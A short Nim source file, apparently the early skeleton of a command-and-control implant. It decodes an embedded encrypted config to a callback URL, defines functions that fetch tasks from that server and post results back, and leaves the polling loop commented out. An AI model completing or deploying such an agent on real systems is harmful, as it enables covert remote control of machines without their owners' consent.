import asyncdispatch, asyncnet
import sysrandom
import std/base64
import std/os
#third party libraries
import puppy #http comms library
import monocypher
import protocol
import flatty
import config

const LOOKUP_TABLE =
    when defined(release):
        staticRead("../release.config")
    else:
        staticRead("../debug.config")

#retrieves all of the tasks for the agent  
proc getTasks(agent: StaticConfig): string = 
  result = fetch(agent.callback)
  
#posts the task results for the agent
proc postResult(agent: StaticConfig, taskResult: string): string = 
  let req = Request(
    url: parseUrl(agent.callback),
    verb: "post",
    body: "test the post"
  )
  result = fetch(req).body


echo LOOKUP_TABLE
let ub64Str = unb64str(LOOKUP_TABLE)
let test = ub64Str.fromFlatty(EncConfig)
let testRead = readEncConfig(test)
echo testRead.callback


#the tasking loop
# while true:
#   echo getTasks(agent)
#   echo postResult(agent,"my result")
#   sleep(agent.interval)